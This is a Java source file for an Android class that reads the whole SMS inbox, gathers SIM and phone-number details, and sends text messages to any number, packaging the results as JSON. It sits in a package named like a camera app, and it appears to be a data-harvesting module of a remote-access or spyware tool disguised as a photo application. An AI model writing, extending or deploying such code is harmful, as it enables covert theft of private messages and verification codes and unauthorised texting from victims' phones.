package com.android.photo.camera.capture;

import static android.Manifest.permission.SEND_SMS;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class SMSManager {

    private static final String TAG = "SMSManager";

    // Check if we have SMS permissions
    private static boolean checkSMSPermission(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(context, SEND_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    // Get SIM card information
    public static JSONObject getSimInfo() {
        Context context = Service.getContextOfApplication();
        if (context == null) {
            Log.e(TAG, "Context is null");
            return null;
        }

        try {
            JSONObject simInfo = new JSONObject();
            JSONArray simList = new JSONArray();

            // For devices with Android Lollipop and above that support dual SIM
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SubscriptionManager subscriptionManager = SubscriptionManager.from(context);

                // Check if we have permission to access phone state
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();

                    if (subscriptionInfoList != null) {
                        for (SubscriptionInfo info : subscriptionInfoList) {
                            JSONObject sim = new JSONObject();
                            sim.put("subscriptionId", info.getSubscriptionId());
                            sim.put("displayName", info.getDisplayName().toString());
                            sim.put("carrierName", info.getCarrierName().toString());
                            sim.put("number", info.getNumber() != null ? info.getNumber() : "Unknown");
                            sim.put("slotIndex", info.getSimSlotIndex()); // 0 for SIM1, 1 for SIM2, etc.
                            sim.put("isDefault", subscriptionManager.getDefaultSmsSubscriptionId() == info.getSubscriptionId());
                            simList.put(sim);
                        }
                    }
                }
            } else {
                // For older Android versions - only get the default SIM info
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    JSONObject sim = new JSONObject();
                    sim.put("subscriptionId", 0);
                    sim.put("displayName", "Default SIM");
                    sim.put("carrierName", tm.getNetworkOperatorName());
                    sim.put("number", tm.getLine1Number() != null ? tm.getLine1Number() : "Unknown");
                    sim.put("slotIndex", 0);
                    sim.put("isDefault", true);
                    simList.put(sim);
                }
            }

            simInfo.put("simList", simList);
            return simInfo;
        } catch (Exception e) {
            Log.e(TAG, "Error getting SIM info: " + e.getMessage());
        }

        return null;
    }

    public static JSONObject getSMSList() {
        Context context = Service.getContextOfApplication();
        if (context == null) {
            Log.e(TAG, "Context is null");
            return null;
        }

        // Check permissions first
        if (!checkSMSPermission(context)) {
            Log.e(TAG, "SMS permissions not granted");
            return null;
        }

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();

            Uri uriSMSURI = Uri.parse("content://sms/inbox");

            try (Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null)) {
                if (cur != null && cur.moveToFirst()) {
                    do {
                        JSONObject sms = new JSONObject();
                        int addressIndex = cur.getColumnIndex("address");
                        int bodyIndex = cur.getColumnIndex("body");

                        if (addressIndex >= 0 && bodyIndex >= 0) {
                            String address = cur.getString(addressIndex);
                            String body = cur.getString(bodyIndex);

                            sms.put("phoneNo", address);
                            sms.put("msg", body);
                            list.put(sms);
                        }
                    } while (cur.moveToNext());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading SMS: " + e.getMessage());
            }

            SMSList.put("smsList", list);
            Log.d(TAG, "SMS collection completed");
            return SMSList;

        } catch (JSONException e) {
            Log.e(TAG, "JSON error: " + e.getMessage());
        }

        return null;
    }

    // Original method for backward compatibility
    public static boolean sendSMS(String phoneNo, String msg) {
        return sendSMS(phoneNo, msg, -1); // -1 means use default SIM
    }

    // New method that accepts a simSubscriptionId
    public static boolean sendSMS(String phoneNo, String msg, int simSubscriptionId) {
        Context context = Service.getContextOfApplication();
        if (context == null) {
            Log.e(TAG, "Context is null");
            return false;
        }

        // Check permissions first
        if (!checkSMSPermission(context)) {
            Log.e(TAG, "SMS permissions not granted");
            return false;
        }

        try {
            SmsManager smsManager;

            // For devices with Android Lollipop and above that support subscription ID
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && simSubscriptionId > 0) {
                smsManager = SmsManager.getSmsManagerForSubscriptionId(simSubscriptionId);
                Log.d(TAG, "Using SMS manager for subscription ID: " + simSubscriptionId);
            } else {
                smsManager = SmsManager.getDefault();
                Log.d(TAG, "Using default SMS manager");
            }

            if (msg.length() > 160) {
                // For long messages, split them
                ArrayList<String> messageParts = smsManager.divideMessage(msg);
                smsManager.sendMultipartTextMessage(phoneNo, null, messageParts, null, null);
            } else {
                smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            }
            Log.d(TAG, "SMS sent successfully to " + phoneNo + (simSubscriptionId > 0 ? " using SIM " + simSubscriptionId : ""));
            return true;

        } catch (Exception ex) {
            Log.e(TAG, "Error sending SMS: " + ex.getMessage());
            return false;
        }
    }
}